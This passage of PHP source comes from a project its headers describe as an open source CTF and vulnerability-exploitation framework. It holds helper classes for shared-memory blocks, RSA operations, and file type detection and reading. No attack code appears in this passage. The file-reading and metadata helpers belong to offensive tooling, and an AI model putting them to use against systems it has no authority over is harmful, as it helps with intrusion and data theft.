        if ( Class_Base_Format::is_empty ( substr ( $head , ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + self::SIZE_BLOCK_HEAD_BLOCK_NAME + self::SIZE_BLOCK_HEAD_BLOCK_KEY ) , self::SIZE_BLOCK_HEAD_CONTENT_SIZE ) ) ) {
            return false;
        }
        return true;
    }

    public function __construct ( $block_name , $block_key , $content_size , $block_status , $block_mode , $block_type , $content_type , $reserved , $head_end_flag )
    {
        $this->_block_name    = Class_Base_Format::format_name_write ( $block_name , self::SIZE_BLOCK_HEAD_BLOCK_NAME );
        $this->_block_key     = Class_Base_Format::format_key_write ( $block_key );
        $this->_content_size  = Class_Base_Format::format_size_write ( $content_size );
        $this->_block_status  = Class_Base_Format::format_status_write ( $block_status );
        $this->_block_mode    = Class_Base_Format::format_mode_write ( $block_mode );
        $this->_block_type    = Class_Base_Format::format_type_write ( $block_type );
        $this->_content_type  = Class_Base_Format::format_type_write ( $content_type );
        $this->_reserved      = Class_Base_Format::format_reserved_write ( $reserved , self::get_head_reserved_size () );
        $this->_head_end_flag = Class_Base_Format::format_end_flag_write ( $head_end_flag , self::SIZE_BLOCK_HEAD_END_FLAG );
    }

    public function __destruct ()
    {
        $this->_block_name    = null;
        $this->_block_key     = null;
        $this->_content_size  = null;
        $this->_block_status  = null;
        $this->_block_mode    = null;
        $this->_block_type    = null;
        $this->_content_type  = null;
        $this->_reserved      = null;
        $this->_head_end_flag = null;
    }

    public function set_block_name ( $block_name )
    {
        $this->_block_name = Class_Base_Format::format_name_write ( $block_name , self::SIZE_BLOCK_HEAD_BLOCK_NAME );
    }

    public function set_block_key ( $block_key )
    {
        $this->_block_key = Class_Base_Format::format_key_write ( $block_key );
    }

    public function set_content_size ( $content_size )
    {
        $this->_content_size = Class_Base_Format::format_size_write ( $content_size );
    }

    public function set_block_status ( $block_status )
    {
        $this->_block_status = Class_Base_Format::format_status_write ( $block_status );
    }

    public function set_block_mode ( $block_mode )
    {
        $this->_block_mode = Class_Base_Format::format_mode_write ( $block_mode );
    }

    public function set_block_type ( $block_type )
    {
        $this->_block_type = Class_Base_Format::format_type_write ( $block_type );
    }

    public function set_content_type ( $content_type )
    {
        $this->_content_type = Class_Base_Format::format_type_write ( $content_type );
    }

    public function set_reserved ( $reserved )
    {
        $this->_reserved = Class_Base_Format::format_reserved_write ( $reserved , self::SIZE_BLOCK_HEAD_RESERVED );
    }

    public function set_head_end_flag ( $_head_end_flag )
    {
        $this->_head_end_flag = Class_Base_Format::format_end_flag_write ( $_head_end_flag , self::SIZE_BLOCK_HEAD_END_FLAG );
    }

    public function get_block_name ()
    {
        $_block_name = Class_Base_Format::format_name_read ( $this->_block_name );
        return $_block_name;
    }

    public function get_block_key ()
    {
        $_block_key = Class_Base_Format::format_key_read ( $this->_block_key );
        return $_block_key;
    }

    public function get_content_size ()
    {
        $_content_size = Class_Base_Format::format_size_read ( $this->_content_size );
        return $_content_size;
    }

    public function get_block_status ()
    {
        $_block_status = Class_Base_Format::format_status_read ( $this->_block_status );
        return $_block_status;
    }

    public function get_block_mode ()
    {
        $_block_mode = Class_Base_Format::format_mode_read ( $this->_block_mode );
        return $_block_mode;
    }

    public function get_block_type ()
    {
        $_block_type = Class_Base_Format::format_type_read ( $this->_block_type );
        return $_block_type;
    }

    public function get_content_type ()
    {
        $_content_type = Class_Base_Format::format_type_read ( $this->_content_type );
        return $_content_type;
    }

    public function get_reserved ()
    {
        $_reserved = Class_Base_Format::format_reserved_read ( $this->_reserved );
        return $_reserved;
    }

    public function get_head_end_flag ()
    {
        $_head_end_flag = Class_Base_Format::format_end_flag_read ( $this->_head_end_flag );
        return $_head_end_flag;
    }

    public function get_encode_block_name ()
    {
        return $this->_block_name;
    }

    public function get_encode_block_key ()
    {
        return $this->_block_key;
    }

    public function get_encode_content_size ()
    {
        return $this->_content_size;
    }

    public function get_encode_block_status ()
    {
        return $this->_block_status;
    }

    public function get_encode_block_mode ()
    {
        return $this->_block_mode;
    }

    public function get_encode_block_type ()
    {
        return $this->_block_type;
    }

    public function get_encode_content_type ()
    {
        return $this->_content_type;
    }

    public function get_encode_reserved ()
    {
        return $this->_reserved;
    }

    public function get_encode_head_end_flag ()
    {
        return $this->_head_end_flag;
    }

    public function get_block_string ()
    {
        $_block_string = ( $this->_block_name . $this->_block_key . $this->_content_size . $this->_block_status . $this->_block_mode . $this->_block_type . $this->_content_type . $this->_reserved . $this->_head_end_flag );
        return $_block_string;
    }

    public function get_block_string_size ()
    {
        $_block_string        = self::get_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-23
 * Time: 下午12:00
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Lock extends Class_Base implements Interface_Base_Lock
{

}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-5-18
 * Time: 下午4:54
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_Security_Rsa extends Class_Base implements Interface_Base_Security_Rsa
{
    public static function construct ( $private_key = null , $public_key = null )
    {
        $_keys = array ();
        if ( is_string ( $private_key ) ) {
            $pem                             = chunk_split ( $private_key , 64 , "\n" );
            $pem                             = "-----BEGIN PRIVATE KEY-----\n" . $pem . "-----END PRIVATE KEY-----\n";
            $_keys[ "private_key_resource" ] = openssl_pkey_get_private ( $pem );
        }
        if ( is_string ( $public_key ) ) {
            $pem                            = chunk_split ( $public_key , 64 , "\n" );
            $pem                            = "-----BEGIN PUBLIC KEY-----\n" . $pem . "-----END PUBLIC KEY-----\n";
            $_keys[ "public_key_resource" ] = openssl_pkey_get_public ( $pem );
        }
        return $_keys;
    }

    public static function destruct ( $private_key_resource , $public_key_resource )
    {
        if ( is_resource ( $private_key_resource ) ) {
            @openssl_free_key ( $private_key_resource );
        }
        if ( is_resource ( $public_key_resource ) ) {
            @openssl_free_key ( $public_key_resource );
        }
    }

    /**
     * * setup the private key
     */
    public static function create_private_key_resource ( $private_key )
    {
        if ( ! is_string ( $private_key ) ) {
            return null;
        }
        $pem                   = chunk_split ( $private_key , 64 , "\n" );
        $pem                   = "-----BEGIN PRIVATE KEY-----\n" . $pem . "-----END PRIVATE KEY-----\n";
        $_private_key_resource = openssl_pkey_get_private ( $pem );
        return $_private_key_resource;
    }

    /**
     * * setup the public key
     */
    public static function create_public_key_resource ( $public_key )
    {
        if ( ! is_string ( $public_key ) ) {
            return null;
        }
        $pem                  = chunk_split ( $public_key , 64 , "\n" );
        $pem                  = "-----BEGIN PUBLIC KEY-----\n" . $pem . "-----END PUBLIC KEY-----\n";
        $_public_key_resource = openssl_pkey_get_public ( $pem );
        return $_public_key_resource;
    }

    /**
     * * encrypt with the private key
     */
    public static function private_encode ( $public_decode_data , $private_key_resource )
    {
        if ( ! is_string ( $public_decode_data ) ) {
            return null;
        }
        if ( ( ! is_resource ( $private_key_resource ) ) && ( ! is_object ( $private_key_resource ) ) ) {
            return null;
        }
        $r = openssl_private_encrypt ( $public_decode_data , $private_encode_data , $private_key_resource );
        if ( $r ) {
            return base64_encode ( $private_encode_data );
        }
        return null;
    }

    /**
     * * decrypt with the private key
     */
    public static function private_decode ( $public_encode_data , $private_key_resource )
    {
        if ( ! is_string ( $public_encode_data ) ) {
            return null;
        }
        if ( ( ! is_resource ( $private_key_resource ) ) && ( ! is_object ( $private_key_resource ) ) ) {
            return null;
        }
        $public_encode_data = base64_decode ( $public_encode_data );
        $r                  = openssl_private_decrypt ( $public_encode_data , $private_decode_data , $private_key_resource );
        if ( $r ) {
            return $private_decode_data;
        }
        return null;
    }

    /**
     * * encrypt with public key
     */
    public static function public_encode ( $private_decode_data , $public_key_resource )
    {
        if ( ! is_string ( $private_decode_data ) ) {
            return null;
        }
        if ( ( ! is_resource ( $public_key_resource ) ) && ( ! is_object ( $public_key_resource ) ) ) {
            return null;
        }
        $r = openssl_public_encrypt ( $private_decode_data , $public_encode_data , $public_key_resource );
        if ( $r ) {
            return base64_encode ( $public_encode_data );
        }
        return null;
    }

    /**
     * * decrypt with the public key
     */
    public static function public_decode ( $private_encode_data , $public_key_resource )
    {
        if ( ! is_string ( $private_encode_data ) ) {
            return null;
        }
        if ( ( ! is_resource ( $public_key_resource ) ) && ( ! is_object ( $public_key_resource ) ) ) {
            return null;
        }
        $private_encode_data = base64_decode ( $private_encode_data );
        $r                   = openssl_public_decrypt ( $private_encode_data , $public_decode_data , $public_key_resource );
        if ( $r ) {
            return $public_decode_data;
        }
        return null;
    }

    public static function sign ( $data , $private_key_resource )
    {
        if ( ( ! is_resource ( $private_key_resource ) ) && ( ! is_object ( $private_key_resource ) ) ) {
            return null;
        }
        $signature = false;
        openssl_sign ( $data , $signature , $private_key_resource );
        return base64_encode ( $signature );
    }

    public static function verify ( $data , $sign , $public_key_resource )
    {
        if ( ( ! is_resource ( $public_key_resource ) ) && ( ! is_object ( $public_key_resource ) ) ) {
            return null;
        }
        $signature = base64_decode ( $sign );
        $flag      = openssl_verify ( $data , $signature , $public_key_resource );
        return $flag;
    }

}


/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-2-10
 * Time: 下午3:35
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_BlockContent extends Class_Base implements Interface_Base_BlockContent
{
    private $_content = null;

    public static function get_content_offset ()
    {
        $_offset = ( Class_Base_Memory::SHARE_MEMORY_OFFSET_START + Class_Base_BlockHead::SIZE_BLOCK_HEAD_BLOCK_NAME + Class_Base_BlockHead::SIZE_BLOCK_HEAD_BLOCK_KEY + Class_Base_BlockHead::SIZE_BLOCK_HEAD_CONTENT_SIZE + Class_Base_BlockHead::SIZE_BLOCK_HEAD_BLOCK_STATUS + Class_Base_BlockHead::SIZE_BLOCK_HEAD_BLOCK_MODE + Class_Base_BlockHead::SIZE_BLOCK_HEAD_BLOCK_TYPE + Class_Base_BlockHead::SIZE_BLOCK_HEAD_CONTENT_TYPE + Class_Base_BlockHead::SIZE_BLOCK_HEAD_RESERVED + Class_Base_BlockHead::SIZE_BLOCK_HEAD_END_FLAG );
        return $_offset;
    }

    public static function is_block_content ( $block )
    {
        if ( ( empty( $block ) ) || ( ! is_object ( $block ) ) || ( ! ( $block instanceof Class_Base_BlockContent ) ) ) {
            return false;
        }
        return true;
    }

    public static function check_block_content ( $block )
    {
        if ( ! property_exists ( $block , "content" ) ) {
            return false;
        }
        if ( ( is_null ( $block->_content ) ) || ( ! is_string ( $block->_content ) ) ) {
            return false;
        }
        return true;
    }

    public static function create_block_content ( $content , $size )
    {
        $_block_content = new Class_Base_BlockContent( $content , $size );
        return $_block_content;
    }

    public function __construct ( $content , $size )
    {
        if ( is_integer ( $content ) ) {
            $content = strval ( $content );
        }
        if ( ( ! is_null ( $content ) ) && ( ! is_string ( $content ) ) ) {
            throw new \Exception( "content is not null and is not a string" , 0 );
        }
        if ( is_null ( $content ) || ( strlen ( $content ) <= 0 ) ) {
            $content = str_repeat ( "\0" , $size );
        }
        if ( strlen ( $content ) > $size ) {
            $content = substr ( $content , 0 , $size );
        }
        if ( strlen ( $content ) < $size ) {
            $content = str_pad ( $content , $size , "\0" , STR_PAD_RIGHT );
        }
        $this->_content = $content;
    }

    public function __destruct ()
    {
        $this->_content = null;
    }

    public function get_content ()
    {
        $_content = Class_Base_Format::data_to_string ( $this->_content );
        return $_content;
    }

    public function get_content_size ()
    {
        $_content        = self::get_content ();
        $_content_length = strlen ( $_content );
        return $_content_length;
    }

    public function get_encode_content ()
    {
        $_content = $this->_content;
        return $_content;
    }

    public function get_encode_content_size ()
    {
        $_block_content_length = strlen ( $this->_content );
        return $_block_content_length;
    }

    public function get_block_string ()
    {
        $_block_string = ( $this->_content );
        return $_block_string;
    }

    public function get_block_string_size ()
    {
        $_block_string        = self::get_block_string ();
        $_block_string_length = strlen ( $_block_string );
        return $_block_string_length;
    }
}

/**
 * Created by PhpStorm.
 * User: huc0day
 * Date: 23-1-24
 * Time: 上午11:36
 */

/*
=======================================================================================================
Phpsploit-Framework is an open source CTF framework and vulnerability exploitation development library.
Copyright (C) 2022-2023, huc0day (Chinese name: GaoJian).
All rights reserved.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY;   without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.    See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.    If not, see <https://www.gnu.org/licenses/>.
=======================================================================================================
 */

class Class_Base_File extends Class_Base implements Interface_Base_File
{
    const SIZE_FILE_CONTENT_LIMIT   = 1048576;
    const TYPE_FILE_TEXT            = "text";
    const TYPE_FILE_APPLICATION     = "application";
    const TYPE_FILE_IMAGE           = "image";
    const TYPE_FILE_AUDIO           = "audio";
    const TYPE_FILE_VIDEO           = "video";
    const TYPE_DATA_TEXT            = 10000001;
    const TYPE_DATA_BIN             = 10000002;
    const TYPE_NAME_PE              = "PE";
    const TYPE_NAME_ELF             = "ELF";
    const TYPE_NAME_JPG             = "JPG";
    const TYPE_NAME_PNG             = "PNG";
    const TYPE_NAME_GIF             = "GIF";
    const TYPE_NAME_TIF             = "TIF";
    const TYPE_NAME_BMP             = "BMP";
    const TYPE_NAME_DWG             = "DWG";
    const TYPE_NAME_PSD             = "PSD";
    const TYPE_NAME_RTF             = "RTF";
    const TYPE_NAME_XML             = "XML";
    const TYPE_NAME_HTML            = "HTML";
    const TYPE_NAME_EML             = "EML";
    const TYPE_NAME_DBX             = "DBX";
    const TYPE_NAME_PST             = "PST";
    const TYPE_NAME_XLS_DOC         = "XLS_DOC";
    const TYPE_NAME_MDB             = "MDB";
    const TYPE_NAME_WPD             = "WPD";
    const TYPE_NAME_EPS_PS          = "EPS_PS";
    const TYPE_NAME_PDF             = "PDF";
    const TYPE_NAME_PWL             = "PWL";
    const TYPE_NAME_ZIP             = "ZIP";
    const TYPE_NAME_RAR             = "RAR";
    const TYPE_NAME_WAV             = "WAV";
    const TYPE_NAME_AVI             = "AVI";
    const TYPE_NAME_RAM             = "RAM";
    const TYPE_NAME_RM              = "RM";
    const TYPE_NAME_MPG_VIDEO_AUDIO = "MPG_VIDEO_AUDIO";
    const TYPE_NAME_MPG_VIDEO       = "MPG_VIDEO";
    const TYPE_NAME_MOV             = "MOV";
    const TYPE_NAME_ASF             = "ASF";
    const TYPE_NAME_MID             = "MID";

    const TYPE_NAME_RPM   = "RPM";
    const TYPE_NAME_BIN_  = "BIN";
    const TYPE_NAME_BZ2   = "BZ2";
    const TYPE_NAME_CLASS = "CLASS";
    const TYPE_NAME_ISO   = "ISO";
    const TYPE_NAME_DMG   = "DMG";
    const TYPE_NAME_MP4   = "MP4";

    const TYPE_HEX_PE              = "4D5A";
    const TYPE_HEX_ELF             = "7F454C46";
    const TYPE_HEX_JPG             = "FFD8FFE1";
    const TYPE_HEX_PNG             = "89504E47";
    const TYPE_HEX_GIF             = "47494638";
    const TYPE_HEX_TIF             = "49492A00";
    const TYPE_HEX_BMP             = "424D";
    const TYPE_HEX_DWG             = "41433130";
    const TYPE_HEX_PSD             = "38425053";
    const TYPE_HEX_RTF             = "7B5C727466";
    const TYPE_HEX_XML             = "3C3F786D6C";
    const TYPE_HEX_HTML            = "68746D6C3E";
    const TYPE_HEX_EML             = "44656C69766572792D646174";
    const TYPE_HEX_DBX             = "CFAD12FEC5FD746F";
    const TYPE_HEX_PST             = "2142444E";
    const TYPE_HEX_XLS_DOC         = "D0CF11E0";
    const TYPE_HEX_MDB             = "5374616E64617264204A";
    const TYPE_HEX_WPD             = "FF575043";
    const TYPE_HEX_EPS_PS          = "252150532D41646F6265";
    const TYPE_HEX_PDF             = "255044462D312E";
    const TYPE_HEX_PWL             = "E3828596";
    const TYPE_HEX_ZIP             = "504B0304";
    const TYPE_HEX_RAR             = "52617221";
    const TYPE_HEX_WAV             = "57415645";
    const TYPE_HEX_AVI             = "41564920";
    const TYPE_HEX_RAM             = "2E7261FD";
    const TYPE_HEX_RM              = "2E524D46";
    const TYPE_HEX_MPG_VIDEO_AUDIO = "000001BA";
    const TYPE_HEX_MPG_VIDEO       = "000001B3";
    const TYPE_HEX_MOV             = "6D6F6F76";
    const TYPE_HEX_ASF             = "3026B2758E66CF11";
    const TYPE_HEX_MID             = "4D546864";

    const TYPE_HEX_RPM   = "EDABEEDB";
    const TYPE_HEX_BIN_  = "53503031";
    const TYPE_HEX_BZ2   = "425A68";
    const TYPE_HEX_CLASS = "CAFEBABE";
    const TYPE_HEX_ISO   = "4344303031";
    const TYPE_HEX_DMG   = "6B6F6C79";
    const TYPE_HEX_MP4   = "6674797069736F6D";

    private static $_file_head_type_hexs = array (
        self::TYPE_NAME_PE              => self::TYPE_HEX_PE ,
        self::TYPE_NAME_ELF             => self::TYPE_HEX_ELF ,
        self::TYPE_NAME_JPG             => self::TYPE_HEX_JPG ,
        self::TYPE_NAME_PNG             => self::TYPE_HEX_PNG ,
        self::TYPE_NAME_GIF             => self::TYPE_HEX_GIF ,
        self::TYPE_NAME_TIF             => self::TYPE_HEX_TIF ,
        self::TYPE_NAME_BMP             => self::TYPE_HEX_BMP ,
        self::TYPE_NAME_DWG             => self::TYPE_HEX_DWG ,
        self::TYPE_NAME_PSD             => self::TYPE_HEX_PSD ,
        self::TYPE_NAME_RTF             => self::TYPE_HEX_RTF ,
        self::TYPE_NAME_XML             => self::TYPE_HEX_XML ,
        self::TYPE_NAME_HTML            => self::TYPE_HEX_HTML ,
        self::TYPE_NAME_EML             => self::TYPE_HEX_EML ,
        self::TYPE_NAME_DBX             => self::TYPE_HEX_DBX ,
        self::TYPE_NAME_PST             => self::TYPE_HEX_PST ,
        self::TYPE_NAME_XLS_DOC         => self::TYPE_HEX_XLS_DOC ,
        self::TYPE_NAME_MDB             => self::TYPE_HEX_MDB ,
        self::TYPE_NAME_WPD             => self::TYPE_HEX_WPD ,
        self::TYPE_NAME_EPS_PS          => self::TYPE_HEX_EPS_PS ,
        self::TYPE_NAME_PDF             => self::TYPE_HEX_PDF ,
        self::TYPE_NAME_PWL             => self::TYPE_HEX_PWL ,
        self::TYPE_NAME_ZIP             => self::TYPE_HEX_ZIP ,
        self::TYPE_NAME_RAR             => self::TYPE_HEX_RAR ,
        self::TYPE_NAME_WAV             => self::TYPE_HEX_WAV ,
        self::TYPE_NAME_AVI             => self::TYPE_HEX_AVI ,
        self::TYPE_NAME_RAM             => self::TYPE_HEX_RAM ,
        self::TYPE_NAME_RM              => self::TYPE_HEX_RM ,
        self::TYPE_NAME_MPG_VIDEO_AUDIO => self::TYPE_HEX_MPG_VIDEO_AUDIO ,
        self::TYPE_NAME_MPG_VIDEO       => self::TYPE_HEX_MPG_VIDEO ,
        self::TYPE_NAME_MOV             => self::TYPE_HEX_MOV ,
        self::TYPE_NAME_ASF             => self::TYPE_HEX_ASF ,
        self::TYPE_NAME_MID             => self::TYPE_HEX_MID ,
        self::TYPE_NAME_RPM             => self::TYPE_HEX_RPM ,
        self::TYPE_NAME_BIN_            => self::TYPE_HEX_BIN_ ,
        self::TYPE_NAME_BZ2             => self::TYPE_HEX_BZ2 ,
        self::TYPE_NAME_CLASS           => self::TYPE_HEX_CLASS ,
        self::TYPE_NAME_ISO             => self::TYPE_NAME_ISO ,
        self::TYPE_NAME_DMG             => self::TYPE_HEX_DMG ,
        self::TYPE_NAME_MP4             => self::TYPE_HEX_MP4 ,
    );

    private static $_file_head_type_names = array (
        self::TYPE_HEX_PE              => self::TYPE_NAME_PE ,
        self::TYPE_HEX_ELF             => self::TYPE_NAME_ELF ,
        self::TYPE_HEX_JPG             => self::TYPE_NAME_JPG ,
        self::TYPE_HEX_PNG             => self::TYPE_NAME_PNG ,
        self::TYPE_HEX_GIF             => self::TYPE_NAME_GIF ,
        self::TYPE_HEX_TIF             => self::TYPE_NAME_TIF ,
        self::TYPE_HEX_BMP             => self::TYPE_NAME_BMP ,
        self::TYPE_HEX_DWG             => self::TYPE_NAME_DWG ,
        self::TYPE_HEX_PSD             => self::TYPE_NAME_PSD ,
        self::TYPE_HEX_RTF             => self::TYPE_NAME_RTF ,
        self::TYPE_HEX_XML             => self::TYPE_NAME_XML ,
        self::TYPE_HEX_HTML            => self::TYPE_NAME_HTML ,
        self::TYPE_HEX_EML             => self::TYPE_NAME_EML ,
        self::TYPE_HEX_DBX             => self::TYPE_NAME_DBX ,
        self::TYPE_HEX_PST             => self::TYPE_NAME_PST ,
        self::TYPE_HEX_XLS_DOC         => self::TYPE_NAME_XLS_DOC ,
        self::TYPE_HEX_MDB             => self::TYPE_NAME_MDB ,
        self::TYPE_HEX_WPD             => self::TYPE_NAME_WPD ,
        self::TYPE_HEX_EPS_PS          => self::TYPE_NAME_EPS_PS ,
        self::TYPE_HEX_PDF             => self::TYPE_NAME_PDF ,
        self::TYPE_HEX_PWL             => self::TYPE_NAME_PWL ,
        self::TYPE_HEX_ZIP             => self::TYPE_NAME_ZIP ,
        self::TYPE_HEX_RAR             => self::TYPE_NAME_RAR ,
        self::TYPE_HEX_WAV             => self::TYPE_NAME_WAV ,
        self::TYPE_HEX_AVI             => self::TYPE_NAME_AVI ,
        self::TYPE_HEX_RAM             => self::TYPE_NAME_RAM ,
        self::TYPE_HEX_RM              => self::TYPE_NAME_RM ,
        self::TYPE_HEX_MPG_VIDEO_AUDIO => self::TYPE_NAME_MPG_VIDEO_AUDIO ,
        self::TYPE_HEX_MPG_VIDEO       => self::TYPE_NAME_MPG_VIDEO ,
        self::TYPE_HEX_MOV             => self::TYPE_NAME_MOV ,
        self::TYPE_HEX_ASF             => self::TYPE_NAME_ASF ,
        self::TYPE_HEX_MID             => self::TYPE_NAME_MID ,
        self::TYPE_HEX_RPM             => self::TYPE_NAME_RPM ,
        self::TYPE_HEX_BIN_            => self::TYPE_NAME_BIN_ ,
        self::TYPE_HEX_BZ2             => self::TYPE_NAME_BZ2 ,
        self::TYPE_HEX_CLASS           => self::TYPE_NAME_CLASS ,
        self::TYPE_HEX_ISO             => self::TYPE_NAME_ISO ,
        self::TYPE_HEX_DMG             => self::TYPE_NAME_DMG ,
        self::TYPE_HEX_MP4             => self::TYPE_NAME_MP4 ,
    );

    protected static $_file_type_all = array ( self::TYPE_FILE_TEXT , self::TYPE_FILE_APPLICATION , self::TYPE_FILE_IMAGE , self::TYPE_FILE_AUDIO , self::TYPE_FILE_VIDEO );
    protected static $_data_type_all = array ( self::TYPE_DATA_TEXT , self::TYPE_DATA_BIN );

    public static function get_file_type_all ()
    {
        return self::$_file_type_all;
    }

    public static function get_mime_content_type ( $file_path )
    {
        if ( file_exists ( $file_path ) && is_file ( $file_path ) ) {
            $_file_type = mime_content_type ( $file_path );
            return $_file_type;
        }
        return false;
    }

    public static function get_file_type ( $file_path )
    {
        if ( file_exists ( $file_path ) && is_file ( $file_path ) ) {
            $_file_type = mime_content_type ( $file_path );
            if ( $_file_type !== false ) {
                $_last_path_delimiter_position = strrpos ( $file_path , "/" );
                if ( $_last_path_delimiter_position !== false ) {
                    $_file_type_items = explode ( "/" , $_file_type );
                    $_file_type       = $_file_type_items[ 0 ];
                    return $_file_type;
                }
            }
        }
        return false;
    }

    public static function get_file_data_type ( $file_path )
    {
        if ( file_exists ( $file_path ) && is_file ( $file_path ) ) {
            $_file_type = mime_content_type ( $file_path );
            if ( $_file_type !== false ) {
                if ( strlen ( $_file_type ) > 4 ) {
                    if ( substr ( $_file_type , 0 , 4 ) == self::TYPE_FILE_TEXT ) {
                        $_data_type = Class_Base_Format::TYPE_DATA_TEXT;
                    } else {
                        $_data_type = Class_Base_Format::TYPE_DATA_BIN;
                    }
                    return $_data_type;
                }
            }
        }
        return false;
    }

    public static function get_file_head_type_name ( $hex )
    {
        if ( ! empty( self::$_file_head_type_names[ $hex ] ) ) {
            return self::$_file_head_type_names[ $hex ];
        }
        return null;
    }

    public static function get_file_head_type_hex ( $name )
    {
        if ( ! empty( self::$_file_head_type_hexs[ $name ] ) ) {
            return self::$_file_head_type_hexs[ $name ];
        }
        return null;
    }

    public static function exist_dir ( $dir )
    {
        if ( file_exists ( $dir ) && ( is_dir ( $dir ) ) ) {
            return true;
        }
        return false;
    }

    public static function exist_file ( $file )
    {
        if ( file_exists ( $file ) && ( is_file ( $file ) ) ) {
            return true;
        }
        return false;
    }

    public static function get_file_size ( $file_path )
    {
        if ( file_exists ( $file_path ) && is_file ( $file_path ) ) {
            $_file_size = filesize ( $file_path );
            return $_file_size;
        }
        return false;
    }

    public static function get_file_stat ( $file )
    {

    }

    public static function pack_format_hex_big_endian_byte_order ( $string )
    {
        $_bin = pack ( "H*" , $string );
        if ( isset( $_bin ) ) {
            return $_bin;
        }
        return null;
    }

    public static function uppack_format_hex_big_endian_byte_order ( $bin )
    {
        $_array = unpack ( "H*" , $bin );
        if ( is_array ( $_array ) ) {
            return $_array[ 0 ];
        }
        return null;
    }

    public static function get_head_type ( $file )
    {
        if ( self::exist_file ( $file ) ) {
            $_file_handle = @fopen ( $file , "rb" );
            if ( ! empty( $_file_handle ) ) {
                $_file_header = fread ( $_file_handle , 16 );
                if ( $_file_header !== false ) {
                    fclose ( $_file_handle );
                    foreach ( self::$_file_head_type_hexs as $key => $value ) {
                        $_bin_format_string        = self::pack_format_hex_big_endian_byte_order ( $key );
                        $_bin_format_string_length = strlen ( $_bin_format_string );
                        $_bin                      = substr ( $_file_header , 0 , $_bin_format_string_length );
                        $_upper_hex                = strtoupper ( self::uppack_format_hex_big_endian_byte_order ( $_bin ) );
                        if ( ! empty( self::$_file_head_type_names[ $_upper_hex ] ) ) {
                            return self::$_file_head_type_names[ $_upper_hex ];
                        }
                    }
                } else {
                    fclose ( $_file_handle );
                }
            }
        }
        return null;
    }

    public static function get_text_content ( $file )
    {
        if ( ( self::exist_file ( $file ) ) && ( self::get_file_size ( $file ) <= ( 1024 * 1024 * 16 ) ) ) {
            $_fp = @fopen ( $file , "r" );
            if ( ! empty( $_fp ) ) {
                $_content = fread ( $_fp , ( 1024 * 1024 * 16 ) );
                if ( $_content !== false ) {
                    fclose ( $_fp );
                    return $_content;
                } else {
                    fclose ( $_fp );
                }
            }
        }
        return null;
    }

    public static function get_bin_content ( $file )
    {
        if ( ( self::exist_file ( $file ) ) && ( self::get_file_size ( $file ) <= ( 1024 * 1024 * 16 ) ) ) {
            $_fp = @fopen ( $file , "rb" );
            if ( ! empty( $_fp ) ) {
                $_content = fread ( $_fp , ( 1024 * 1024 * 16 ) );
                if ( $_content !== false ) {
                    fclose ( $_fp );
                    return $_content;
                } else {
                    fclose ( $_fp );
                }
            }
        }
        return null;
    }

    public static function get_file_info ( $file_path , $file_content_read_offset = 0 , $data_type = Class_Base_File::TYPE_DATA_BIN )
    {
        $_file_info = array ( "path" => $file_path , "parent_directory" => "" , "exist" => 0 , "type" => "" , "file_type" => "" , "data_type" => "" , "size" => 0 , "perms" => "" , "group" => array () , "owner" => array () , "atime" => 0 , "mtime" => 0 , "inode" => 0 , "ctime" => 0 , "content" => "" , "content_size" => 0 , "content_read_limit" => Class_Base_File::SIZE_FILE_CONTENT_LIMIT , "content_read_offset" => 0 , "content_read_remain" => 0 , "content_read_next_offset" => 0 );
        if ( is_string ( $file_path ) && ( $file_path != "" ) && file_exists ( $file_path ) && is_file ( $file_path ) ) {
            $_file_info[ "exist" ] = 1;
            clearstatcache ( true , $file_path );
            $_parent_directory = dirname ( $file_path );
            if ( $_parent_directory !== false ) {
                $_file_info[ "parent_directory" ] = $_parent_directory;
            }
            $_file_type = mime_content_type ( $file_path );
            if ( $_file_type !== false ) {
                $_file_info[ "type" ]      = $_file_type;
                $_file_info[ "file_type" ] = $_file_type;
            }
            if ( ! is_integer ( $data_type ) ) {
                $data_type = self::TYPE_DATA_BIN;
            }
            if ( ! in_array ( $data_type , self::$_data_type_all ) ) {
                $data_type = self::TYPE_DATA_BIN;
            }
            $_file_info[ "data_type" ] = $data_type;
            $_file_size                = filesize ( $file_path );
